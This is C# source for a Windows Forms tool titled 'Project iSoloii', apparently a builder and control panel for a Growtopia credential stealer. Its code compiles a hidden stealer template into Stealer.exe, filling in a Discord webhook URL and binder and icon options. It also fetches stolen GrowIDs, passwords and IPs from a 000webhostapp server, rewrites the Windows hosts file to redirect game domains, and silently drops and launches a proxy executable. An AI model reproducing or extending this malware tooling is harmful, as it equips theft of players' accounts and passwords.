            this.zz.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(this.zz_DrawSubItem);
            this.zz.MouseClick += new System.Windows.Forms.MouseEventHandler(this.zz_MouseClick);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "GrowID";
            this.columnHeader1.Width = 168;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Password";
            this.columnHeader2.Width = 160;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "IP";
            this.columnHeader3.Width = 112;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Date";
            // 
            // metroLabel1
            // 
            this.metroLabel1.AutoSize = true;
            this.metroLabel1.Location = new System.Drawing.Point(3, 321);
            this.metroLabel1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.metroLabel1.Name = "metroLabel1";
            this.metroLabel1.Size = new System.Drawing.Size(64, 19);
            this.metroLabel1.TabIndex = 6;
            this.metroLabel1.Text = "Accounts:";
            this.metroLabel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroButton5
            // 
            this.metroButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.metroButton5.Highlight = true;
            this.metroButton5.Location = new System.Drawing.Point(512, 318);
            this.metroButton5.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton5.Name = "metroButton5";
            this.metroButton5.Size = new System.Drawing.Size(95, 28);
            this.metroButton5.Style = MetroFramework.MetroColorStyle.Magenta;
            this.metroButton5.TabIndex = 5;
            this.metroButton5.Text = "Refresh";
            this.metroButton5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton5.Click += new System.EventHandler(this.metroButton5_Click_1);
            // 
            // deleteAccountToolStripMenuItem
            // 
            this.deleteAccountToolStripMenuItem.Name = "deleteAccountToolStripMenuItem";
            this.deleteAccountToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
            this.deleteAccountToolStripMenuItem.Text = "Delete Account";
            // 
            // AAPIniDialog
            // 
            this.AAPIniDialog.FileName = "AAP.ini";
            // 
            // BinderFileDialog
            // 
            this.BinderFileDialog.FileOk += new System.ComponentModel.CancelEventHandler(this.BinderFileDialog_FileOk_1);
            // 
            // richTextBox1
            // 
            this.richTextBox1.Location = new System.Drawing.Point(282, 28);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(10, 10);
            this.richTextBox1.TabIndex = 16;
            this.richTextBox1.Text = resources.GetString("richTextBox1.Text");
            this.richTextBox1.Visible = false;
            // 
            // txtPEName
            // 
            this.txtPEName.Owner = null;
            this.txtPEName.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroTextBox1
            // 
            this.metroTextBox1.Owner = null;
            this.metroTextBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.AutoSize = true;
            this.ClientSize = new System.Drawing.Size(702, 458);
            this.Controls.Add(this.richTextBox1);
            this.Controls.Add(this.EternityTabs);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.metroButton3);
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.Name = "Main";
            this.Padding = new System.Windows.Forms.Padding(16, 60, 16, 16);
            this.Resizable = false;
            this.Style = MetroFramework.MetroColorStyle.Magenta;
            this.Text = "Project iSoloii";
            this.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.Load += new System.EventHandler(this.Main_Load);
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.UnbannerTab.ResumeLayout(false);
            this.groupBox5.ResumeLayout(false);
            this.groupBox5.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox3.ResumeLayout(false);
            this.EternityTabs.ResumeLayout(false);
            this.ResumeLayout(false);

		}




        private Info fm;

		private readonly IniFile MyIni = new IniFile("Eternity.ini");

		private string user;

		private string pass;

		private string eurl;

		private Stopwatch td;

		private IContainer components;

		private MetroStyleManager metroStyleManager1;

		private PictureBox pictureBox1;

		private OpenFileDialog openFileDialog1;

		private MetroTabControl EternityTabs;

		private MetroTabPage UnbannerTab;

		private MetroButton metroButton3;

		private MetroTabPage StealerTab;

		private MetroButton metroButton1;

		private GroupBox groupBox1;

		private Label label3;

		// Token: 0x04000031 RID: 49
		private Label label1;

		// Token: 0x0400003A RID: 58
		private MetroButton metroButton4;

		// Token: 0x0400003B RID: 59
		private OpenFileDialog AAPIniDialog;

		// Token: 0x0400003E RID: 62
		private OpenFileDialog BinderFileDialog;

		// Token: 0x04000040 RID: 64
		private MetroTabPage SavedatsTab;

		// Token: 0x04000041 RID: 65
	//	private MetroContextMenu metroContextMenu1;

		// Token: 0x04000042 RID: 66
		private ToolStripMenuItem deleteAccountToolStripMenuItem;

		// Token: 0x04000048 RID: 72
		private MetroButton metroButton5;

		// Token: 0x0400004A RID: 74
		private Panel panel2;

		// Token: 0x0400004B RID: 75
		private Panel panel1;

		// Token: 0x0400004C RID: 76
		private GroupBox groupBox5;

		// Token: 0x0400004D RID: 77
		private Label label5;

		// Token: 0x0400004E RID: 78
		private Label label4;

		// Token: 0x0400004F RID: 79
		private MetroButton metroButton12;

		// Token: 0x04000050 RID: 80
		private Label label2;

		// Token: 0x04000051 RID: 81
		private MetroTextBox metroTextBox3;

		// Token: 0x04000052 RID: 82
		private MetroButton metroButton11;

		// Token: 0x04000053 RID: 83
		private GroupBox groupBox4;

		// Token: 0x04000054 RID: 84
		private GroupBox groupBox3;

		// Token: 0x04000055 RID: 85
		private MetroButton metroButton9;

		// Token: 0x04000056 RID: 86
		private MetroButton metroButton6;

		// Token: 0x04000057 RID: 87
		private MetroButton metroButton7;

		// Token: 0x04000058 RID: 88
		private MetroButton metroButton8;

		// Token: 0x04000059 RID: 89
		private Panel panel3;

		// Token: 0x0400005A RID: 90
		private MetroLabel metroLabel1;
        private RichTextBox richTextBox1;
        private ListView zz;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader4;
        private string text3;
        public string username = "";
        private MetroTextBox file;
        private MetroTextBox url;
        private GroupBox groupBox6;
        private MetroCheckBox metroCheckBox1;
        private MetroCheckBox metroCheckBox2;
        private MetroButton metroButton13;
        private MetroButton metroButton14;
        private MetroCheckBox metroCheckBox3;
        private MetroCheckBox metroCheckBox4;
        private MetroCheckBox metroCheckBox5;
        private MetroCheckBox metroCheckBox6;
        private MetroCheckBox metroCheckBox7;
        private MetroCheckBox metroCheckBox8;
        private MetroStyleManager txtPEName;
        private MetroStyleManager metroTextBox1;
        public string password = "";

        public Main(string text, string text2)
        {
            InitializeComponent();
            Text = text;
            username = text;
            password = text2;
        }

        private void metroButton5_Click_1(object sender, EventArgs e)
		{
            zz.Items.Clear();
            eurl = "http://wowprohaxerkk.000webhostapp.com/";
            StreamReader streamReader = new StreamReader(WebRequest.Create(eurl + "validate.php?username=" + user).GetResponse().GetResponseStream());
            string a = streamReader.ReadToEnd();
            streamReader.Dispose();
            zz.Items.Clear();
            StreamReader streamReader2 = new StreamReader(WebRequest.Create(string.Concat(new string[]
            {
                eurl,
                "getaccs.php?username=",
                username,
                "&password=",
                password
            })).GetResponse().GetResponseStream());
            string text = streamReader2.ReadToEnd();
            streamReader2.Dispose();
            string[] array = text.Split(new char[]
            {
                '+'
            });
            List<string[]> list = new List<string[]>();
            foreach (string text2 in array)
            {
                if (!string.IsNullOrEmpty(text2))
                {
                    string[] item = text2.Split(new char[]
                    {
                        ';'
                    });
                    list.Add(item);
                }
            }
            int num = 0;
            foreach (string[] items in list)
            {
                zz.Items.Add(new ListViewItem(items));
                num++;
            }
            metroLabel1.Text = "Accounts: " + num.ToString();
        }

        private void metroButton1_Click_1(object sender, EventArgs e)
        {
            string text;
            text = "SFW";
            //td.Start();
            try
            {
                Console.WriteLine("\r\nChecking requirements..");
                string text2 = Path.GetTempPath() + Path.GetRandomFileName() + "\\";
                Directory.CreateDirectory(text2);
                if (string.IsNullOrWhiteSpace(url.Text) && string.IsNullOrWhiteSpace(file.Text))
                {
                    MessageBox.Show("Webhook URL is empty. Please fill in your Discord server Webhook URL", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {

                    Console.WriteLine("Applying options..");

                    string text3 = richTextBox1.Text;

                    text3 = text3.Replace("*WEBURL*", url.Text);
                    text3 = text3.Replace("*SAVEFILER*", file.Text);
                    text3 = text3.Replace("*USER*", username);
                    if (metroCheckBox8.Checked)
                    {
                        text3 = text3.Replace("aapbfalse", "aapbtrue");
                    }
                    if (metroCheckBox7.Checked)
                    {
                        text3 = text3.Replace("ssdfalse", "ssdtrue");
                    }
                    if (metroCheckBox6.Checked)
                    {
                        text3 = text3.Replace("ctsfalse", "ctstrue");
                    }
                    if (metroCheckBox5.Checked)
                    {
                        text3 = text3.Replace("ssfalse", "sstrue");
                    }
                    if (metroCheckBox4.Checked)
                    {
                        text3 = text3.Replace("asfalse", "astrue");
                    }
                    if (metroCheckBox2.Checked)
                    {
                        text3 = text3.Replace("binderfalse", "bindertrue");
                    }
                    if (metroCheckBox1.Checked)
                    {
                        text3 = text3.Replace("swhfalse", "swhtrue");
                    }
                    List<string> list = new List<string>();
                    try
                    {
                        MessageBox.Show("Compiling stealer..");
                        using (CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider(new Dictionary<string, string>
                        {
                            {
                                "CompilerVersion",
                                "v4.0"
                            }
                        })) 
                        {
                            CompilerParameters compilerParameters = new CompilerParameters(new string[]
                            {
                                "mscorlib.dll",
                                "System.Core.dll"
                            }, text2 + text + ".exe", true)
                            {
                                GenerateExecutable = true
                            };
                            compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                            compilerParameters.ReferencedAssemblies.Add("Microsoft.CSharp.dll");
                            compilerParameters.ReferencedAssemblies.Add("System.dll");
                            compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
                            compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
                            compilerParameters.CompilerOptions = "/target:winexe";
                            compilerParameters.OutputAssembly = Application.StartupPath + "\\Stealer.exe";
                            if (metroCheckBox3.Checked && File.Exists(openFileDialog1.FileName) && openFileDialog1.FileName.EndsWith(".ico"))
                            {
                                CompilerParameters compilerParameters2 = compilerParameters;
                                compilerParameters2.CompilerOptions = compilerParameters2.CompilerOptions + " /win32icon:\"" + openFileDialog1.FileName + "\"";
                            }
                            if (csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
                            {
                                text3
                            }).Errors.HasErrors)
                            {
                                MessageBox.Show("Something Went Wrong", "Error");
                                return;
                            }
                            csharpCodeProvider.Dispose();
                        }
                    }

                    catch (Exception ex2)
                    {
                        MessageBox.Show(ex2.Message);
                    }
                //    MessageBox.Show("bumbe");
                // //   try
                ////    {
                //        Console.WriteLine("Running obfuscator..");

                //        Process process = Process.Start(new ProcessStartInfo
                //        {
                //            FileName = Path.GetTempPath() + "\\confuser.CLI.exe",
                //            Arguments = "\"" + text2 + "Settings.crproj\"",
                //            CreateNoWindow = true,
                //            UseShellExecute = false,
                //            WindowStyle = ProcessWindowStyle.Hidden
                //        });
                //        MessageBox.Show("bumbe1");

                //        process.PriorityClass = ProcessPriorityClass.RealTime;
                //        process.WaitForExit();
                //        process.Dispose();
                //  //  }
                //    //catch (Exception ex3)
                //    //{
                //    //    MessageBox.Show("bumbe2 " + ex3.Message);

                //    //    Console.WriteLine(ex3.Message);
                //    //    try
                //    //    {
                //    //        if (Directory.Exists(text2))
                //    //        {
                //    //            Directory.Delete(text2, true);
                //    //        }
                //    //    }
                //    //    catch
                //    //    {
                //    //        try
                //    //        {
                //    //            Process[] processesByName = Process.GetProcessesByName("Confuser.CLI");
                //    //            for (int i = 0; i < processesByName.Length; i++)
                //    //            {
                //    //                processesByName[i].Kill();
                //    //            }
                //    //            if (Directory.Exists(text2))
                //    //            {
                //    //                Directory.Delete(text2, true);
                //    //            }
                //    //        }
                //    //        catch
                //    //        {
                //    //        }
                //    //    }
                //    //    Clipboard.SetText(eCryptography.Encrypt(ex3.ToString()));
                //    //    return;
                //    //}
                //    try
                //    {
                //        MessageBox.Show("bumbe3");

                //        Console.WriteLine("Copying stealer..");
                //        File.Copy(text2 + "cnf\\" + text + ".exe", Application.StartupPath + "\\" + text + ".exe", true);
                //        Directory.Delete(text2, true);
                //        string[] files = Directory.GetFiles(Path.GetTempPath(), text + ".exe", SearchOption.AllDirectories);
                //        if (files.Length != 0)
                //        {
                //            Directory.Delete(Path.GetDirectoryName(files[0]), true);
                //        }
                //        Console.WriteLine(td.ElapsedMilliseconds);
                //        td.Restart();
                //    }
                //    catch (Exception ex4)
                //    {
                //        MessageBox.Show(ex4.ToString());
                //        try
                //        {
                //            Directory.Delete(text2, true);
                //            Console.WriteLine(ex4.Message);
                //            return;
                //        }
                //        catch
                //        {
                //            return;
                //        }
                //    }
                    MessageBox.Show("Build Succeeded", "Build complete");
                   // td.Stop();
                }
            }
            catch
            {
            }
        }

        private void metroButton10_Click_1(object sender, EventArgs e)
        {
            BinderFileDialog.FileName = "";
            BinderFileDialog.Filter = "Executable Files(*.exe) | *.exe";
            BinderFileDialog.Title = "Select a file to bind.";
            BinderFileDialog.ShowDialog();
        }

        private void metroButton2_Click_1(object sender, EventArgs e)
        {
            openFileDialog1.FileName = "";
            openFileDialog1.InitialDirectory = Application.StartupPath;
            openFileDialog1.Filter = "Icons (*.ico)|*.ico";
            BinderFileDialog.Title = "Select an Icon.";
            openFileDialog1.ShowDialog();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            eurl = "http://wowprohaxerkk.000webhostapp.com/";
            StreamReader streamReader = new StreamReader(WebRequest.Create(eurl + "validate.php?username=" + user).GetResponse().GetResponseStream());
            string a = streamReader.ReadToEnd();
            streamReader.Dispose();
            zz.Items.Clear();
            StreamReader streamReader2 = new StreamReader(WebRequest.Create(string.Concat(new string[]
            {
                eurl,
                "getaccs.php?username=",
                username,
                "&password=",
                password
            })).GetResponse().GetResponseStream());
            string text = streamReader2.ReadToEnd();
            streamReader2.Dispose();
            string[] array = text.Split(new char[]
            {
                '+'
            });
            List<string[]> list = new List<string[]>();
            foreach (string text2 in array)
            {
                if (!string.IsNullOrEmpty(text2))
                {
                    string[] item = text2.Split(new char[]
                    {
                        ';'
                    });
                    list.Add(item);
                }
            }
            int num = 0;
            foreach (string[] items in list)
            {
                zz.Items.Add(new ListViewItem(items));
                num++;
            }
            metroLabel1.Text = "Accounts: " + num.ToString();
        }

        private void metroButton7_Click_1(object sender, EventArgs e)
        {
            if (!File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts").Contains("127.0.0.1 growtopia1.com") && !File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts").Contains("127.0.0.1 growtopia2.com"))
            {
                using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts", true))
                {
                    streamWriter.WriteLine("\r\n127.0.0.1 growtopia1.com");
                    streamWriter.WriteLine("127.0.0.1 growtopia2.com");
                }
            }
        }



        private void metroButton3_Click(object sender, EventArgs e)
        {
            int num = Convert.ToInt32(MyIni.Read("Style", null));
            num++;
            if (num == 15)
            {
                num = 1;
            }
            metroStyleManager1.Style = MetroFramework.MetroColorStyle.Blue;
            MyIni.Write("Style", num.ToString(), null);
        }

        private void metroCheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (!metroCheckBox3.Checked)
            {
                metroButton13.Enabled = false;
                metroButton1.Enabled = true;
                return;
            }
            if (!(openFileDialog1.FileName == ""))
            {
                metroButton1.Enabled = true;
                return;
            }
            metroButton1.Enabled = false;
        }

        private void Main_Shown_1(object sender, EventArgs e)
        {
            if (!MyIni.KeyExists("Style", null))
            {
                MyIni.Write("Style", "0", null);
            }
            int style = Convert.ToInt32(MyIni.Read("Style", null));
            metroStyleManager1.Style = MetroFramework.MetroColorStyle.Blue;
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (td.IsRunning)
            {
                while (td.IsRunning && td.IsRunning)
                {
                }
                fm.Dispose();
                Environment.Exit(0);
            }
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            Unbanner.Start();
        }

        private void metroButton8_Click_1(object sender, EventArgs e)
        {
            string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts");
            text = text.Replace("127.0.0.1 growtopia1.com", "");
            text = text.Replace("127.0.0.1 growtopia2.com", "");
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\drivers\\etc\\hosts", text);
        }

        private void zz_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && zz.FocusedItem.Bounds.Contains(e.Location))
            {
                //	metroContextMenu1.Show(Cursor.Position);
            }
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (!metroCheckBox2.Checked)
            {
                metroButton1.Enabled = true;
                return;
            }
            metroButton14.Enabled = true;
            if (BinderFileDialog.FileName == "")
            {
                metroButton1.Enabled = false;
                return;
            }
            metroButton1.Enabled = true;
        }

        private void zz_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            SolidBrush brush = new SolidBrush(Color.FromArgb(20, 20, 20));
            e.Graphics.FillRectangle(brush, e.Bounds);
            SolidBrush brush2 = new SolidBrush(Color.FromArgb(255, 255, 255));
            e.Graphics.DrawString(e.Header.Text, e.Font, brush2, e.Bounds);
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            if (Process.GetProcessesByName("proxy").Length != 0)
            {
                return;
            }
            File.WriteAllBytes(Path.GetTempPath() + "proxy.exe", Resources.proxy);
            Process process = new Process();
            process.StartInfo.FileName = Path.GetTempPath() + "proxy.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.Dispose();
        }

        private void metroButton9_Click_1(object sender, EventArgs e)
        {
            Process[] processesByName = Process.GetProcessesByName("proxy");
            for (int i = 0; i < processesByName.Length; i++)
            {
                processesByName[i].Kill();
            }
        }

        private void BinderFileDialog_FileOk_1(object sender, CancelEventArgs e)
        {
            if (metroButton1.Enabled)
            {
                metroButton1.Enabled = false;
                return;
            }
            metroButton1.Enabled = true;
        }

        private void zz_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void zz_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }
    }
}
